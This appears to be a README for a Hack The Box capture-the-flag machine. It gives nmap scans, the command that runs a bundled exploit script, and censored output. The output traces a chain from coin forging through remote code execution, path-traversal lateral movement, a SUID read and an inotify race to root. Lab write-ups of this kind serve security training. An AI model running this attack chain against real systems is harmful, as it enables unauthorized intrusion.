# blocksynergy-htb

Complete exploit and quick usage notes for blocksynergy.htb

## Add to /etc/hosts

Add the target to your /etc/hosts so the name resolves locally:

```text
10.10.x.x  blocksynergy.htb
```

Replace `10.10.x.x` with the actual IP address of the target in your lab environment.

## Quick workflow

1. First enumerate the machine to discover open ports and services:

```bash
# basic host discovery / service scan
nmap blocksynergy.htb

# targeted full scan for common services, NSE scripts, version and OS detection
nmap -p22,8080 -sC -sV -O -oA complete-scan.txt blocksynergy.htb
```

2. Continue manual enumeration of discovered services (web, SSH, etc.) based on the scan results.

3. If there is an available exploit that requires a particular profile/rank or configuration, run it. If the exploit requires a specific account/profile and you don't have it, continue intended/manual enumeration to obtain the required access.
```bash
git clone https://github.com/ans-inayat/blocksynergy-htb
```
```bash
cd blocksynergy-htb
```

4. To run the bundled exploit script and read the flags:

```bash
python complete-exploit.py -t blocksynergy.htb
```

## Example exploit output (censored)

Below is an example run of the exploit with sensitive values censored. This documents the high-level steps and outcome without exposing full flags or secrets.

```
[*] step 1: wallet 'w84eb2329' + forge coins
[*]     balance funded, VIP unlocked
[*] step 3: RCE as the web user (id):
[*]     uid=1000(walter) gid=1000(walter) groups=1000(walter)
[*] step 4: lateral to the dev user via :5000 debug-hook traversal
[*]     dev user = hank
[*]     SSH as hank established
[*] step 4.5: retrieving user flag...
[*]     user flag not in common locations, searching...
[*]     trying with SUID binary to read user flag...
[*]     user flag found via SUID binary
[*] step 5: root via restore-daemon inotify race
[*]     payload: /var/restore_work/.pl_84eb2329.tar.gz 689837
[*]     racer armed; waiting for the restore cycle (up to ~7 min)...
[*] root achieved.

============================================================
BLOCKSYNERGY FLAGS:
============================================================
USER FLAG  : b081440fcb190xxxxxxxxxxxxxxxxxxxxx
ROOT FLAG  : c72b91821e7f58xxxxxxxxxxxxxxxxxxxx
============================================================
```

## Notes

- Use sudo when running some nmap options (for OS detection and certain NSE scripts).
- Only run exploits against machines you own or have explicit permission to test.
- Adjust IPs, paths, and filenames to match your environment.
